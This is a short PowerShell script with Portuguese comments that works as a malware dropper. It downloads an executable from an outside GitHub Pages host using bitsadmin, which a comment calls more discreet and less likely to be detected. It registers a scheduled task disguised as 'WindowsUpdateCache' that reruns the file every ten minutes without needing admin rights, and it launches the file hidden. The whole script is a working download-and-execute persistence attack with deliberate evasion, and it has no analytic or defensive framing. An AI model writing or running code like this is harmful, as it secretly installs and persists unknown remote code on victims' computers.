$dir = "$env:TEMP\sys_cache"
if (!(Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force }

# Download via BITSADMIN (Mais discreto e evita detecção de download via script)
start-process "bitsadmin" -ArgumentList "/transfer mydownloadjob https://syslog992.github.io/sys-cache-update/sys_cache.exe $dir\sys_cache.exe" -Wait

# Criação de Tarefa Agendada para persistência
# Registra a tarefa para o usuário atual para evitar erro de "Acesso Negado" (não exige Admin)
$action = New-ScheduledTaskAction -Execute "$dir\sys_cache.exe"
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 10)
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "WindowsUpdateCache" -Force

# Inicia o executável imediatamente em modo oculto
Start-Process "$dir\sys_cache.exe" -WindowStyle Hidden
